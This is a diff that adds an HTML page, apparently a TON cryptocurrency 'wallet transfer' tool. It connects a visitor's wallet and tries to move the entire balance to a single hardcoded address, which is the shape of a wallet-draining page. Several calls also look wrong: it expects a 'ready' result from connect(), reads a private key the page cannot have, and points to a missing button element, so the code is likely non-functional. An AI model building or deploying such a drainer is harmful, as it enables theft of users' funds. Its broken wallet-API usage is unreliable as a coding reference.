@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Wallet Transfer</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/tonweb/dist/tonweb.min.js"></script>
+</head>
+<body>
+    <h1>TON Wallet Transfer</h1>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="transferBtn" style="display: none;">Transfer All Funds to Wallet A</button>
+    <p id="status"></p>
+
+    <script>
+        const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Wallet A address
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://tonconnect.org/manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        const connectBtn = document.getElementById("connectBtn");
+        const transferBtn = document.getElementById("transferBtn");
+        const status = document.getElementById("status");
+
+        let walletBAddress = "";  // This will store Wallet B's address
+
+        // Connect Wallet
+        connectBtn.addEventListener("click", async () => {
+            try {
+                const connectionStatus = await tonConnectUI.connect();
+                if (connectionStatus === 'ready') {
+                    const walletDetails = await tonConnectUI.getWallet();
+                    walletBAddress = walletDetails.address;
+
+                    status.innerText = `Connected to Wallet B: ${walletBAddress}`;
+                    transferBtn.style.display = "block";
+                } else {
+                    status.innerText = "Wallet not connected.";
+                }
+            } catch (error) {
+                status.innerText = "Failed to connect wallet.";
+                console.error("Error connecting wallet:", error);
+            }
+        });
+
+        // Transfer All Funds to Wallet A
+        transferBtn.addEventListener("click", async () => {
+            try {
+                const tonweb = new TonWeb();
+                const walletB = tonweb.wallet.fromAddress(walletBAddress);
+
+                // Fetch Wallet B's balance
+                const balance = await walletB.getBalance();
+                const balanceInTon = balance / Math.pow(10, 9);  // TON is in nanoTON (1e9)
+
+                // Prepare the transaction to send all balance to Wallet A
+                const transaction = await walletB.createTransfer({
+                    secretKey: walletB.secretKey, // User must authorize signing with private key
+                    to: walletAAddress,           // Transfer to Wallet A
+                    amount: balance,              // Send all funds
+                });
+
+                // Sign and send the transaction
+                const signedTransaction = await walletB.signTransfer(transaction);
+                const transactionHash = await tonweb.net.submitTransaction(signedTransaction);
+                
+                status.innerText = `Transaction sent. Hash: ${transactionHash}`;
+            } catch (error) {
+                console.error("Transfer failed:", error);
+                status.innerText = `Transfer failed: ${error.message}`;
+            }
+        });
+    </script>
+</body>
+</html>
